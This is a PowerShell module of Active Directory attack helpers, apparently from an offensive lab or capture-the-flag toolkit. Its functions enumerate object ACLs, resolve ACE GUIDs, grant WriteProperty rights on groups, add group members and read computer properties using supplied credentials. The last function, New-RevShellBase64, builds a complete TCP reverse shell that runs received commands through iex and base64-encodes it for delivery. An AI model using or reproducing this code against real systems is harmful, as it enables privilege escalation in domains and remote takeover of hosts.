function Get-ADObjectAcl
{
    param(
        [Parameter( Mandatory = $true )]
        [string] $Identity
    )

    $computer = Get-ADComputer -Identity $Identity
    $acl = Get-Acl "AD:$($computer.DistinguishedName)"

    return $acl.Access | Select-Object IdentityReference, ActiveDirectoryRights, ObjectType, InheritanceType
}

function Get-ADGroupAcl
{
    param(
        [Parameter( Mandatory = $true )]
        [string] $Identity
    )

    $group = Get-ADGroup -Identity $Identity
    $acl = Get-Acl -Path "AD:\$($group.DistinguishedName)"
    $acl.Access | Select-Object IdentityReference, ActiveDirectoryRights, AccessControlType, ObjectType, InheritanceType
}

function Grant-ADGroupAttributeWritePermission 
{
    param(
        [Parameter( Mandatory = $true )]
        [string] $Group,

        [Parameter( Mandatory = $true )]
        [string] $User,

        [Parameter( Mandatory = $true )]
        [string] $Password,

        [Parameter( Mandatory = $true )]
        [Guid] $Guid
    )

    $cred = New-Object System.Management.Automation.PSCredential($User, (ConvertTo-SecureString $Password -AsPlainText -Force))
    $groupDN = (Get-ADGroup $Group).DistinguishedName
    $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$groupDN", $User, $Password)
    $sec = $de.psbase.ObjectSecurity
    $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule([System.Security.Principal.NTAccount]$User, [System.DirectoryServices.ActiveDirectoryRights]"WriteProperty", [System.Security.AccessControl.AccessControlType]"Allow", [Guid]$Guid, [System.DirectoryServices.ActiveDirectorySecurityInheritance]"None")
    $sec.AddAccessRule($ace)
    $de.psbase.CommitChanges()
}

function Resolve-AceObjectGuid
{
    param(
        [Parameter( Mandatory = $true )]
        [Guid] $ObjectGuid
    )

    $configNC = (Get-ADRootDSE).configurationNamingContext
    $schemaNC = (Get-ADRootDSE).schemaNamingContext

    $right = Get-ADObject -SearchBase "CN=Extended-Rights,$configNC" -Filter "rightsGuid -eq '$ObjectGuid'" -Properties displayName

    if( $right )
    {
        return $right.displayName
    }

    $bytes = $ObjectGuid.ToByteArray()
    $hexFilter = ($bytes | ForEach-Object { "\{0:x2}" -f $_ }) -join ''
    $attr = Get-ADObject -SearchBase $schemaNC -LDAPFilter "(schemaIDGUID=$hexFilter)" -Properties lDAPDisplayName

    if( $attr )
    {
        return $attr.lDAPDisplayName
    }

    return "Unknown GUID: $ObjectGuid"
}

function Add-NewADGroupMember {
    param(
        [Parameter( Mandatory = $true )]
        [string] $Group,

        [Parameter( Mandatory = $true )]
        [string] $User,

        [Parameter( Mandatory = $true )]
        [string] $Password,

        [Parameter( Mandatory = $true )]
        [string] $NewMember
    )

    $cred = New-Object System.Management.Automation.PSCredential($User, (ConvertTo-SecureString $Password -AsPlainText -Force))
    Add-ADGroupMember -Identity $Group -Members $NewMember -Credential $cred
}

function Get-ADComputerProperty {
    param(
        [Parameter( Mandatory = $true )]
        [string] $User,

        [Parameter( Mandatory = $true )]
        [string] $Password,

        [Parameter( Mandatory = $true )]
        [string] $Computer,

        [Parameter( Mandatory = $true )]
        [string] $Property
    )

    $cred = New-Object System.Management.Automation.PSCredential($User, (ConvertTo-SecureString $Password -AsPlainText -Force))
    $dc = Get-ADComputer -Identity $Computer -Properties $Property -Credential $cred
    $dc.$Property
}

function New-RevShellBase64 {
    param(
        [Parameter(Mandatory=$true)]
        [string]$ip,

        [Parameter()]
        [int]$port = 9001
    )

    $command = '$client = New-Object System.Net.Sockets.TCPClient("' + $ip + '",' + $port + ');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)

    $encoded = [Convert]::ToBase64String($bytes)

    Write-Host $encoded
}

Export-ModuleMember -Function Get-ADObjectAcl
Export-ModuleMember -Function Get-ADGroupAcl
Export-ModuleMember -Function Resolve-AceObjectGuid
Export-ModuleMember -Function Grant-ADGroupAttributeWritePermission
Export-ModuleMember -Function Add-NewADGroupMember
Export-ModuleMember -Function Get-ADComputerProperty
Export-ModuleMember -Function New-RevShellBase64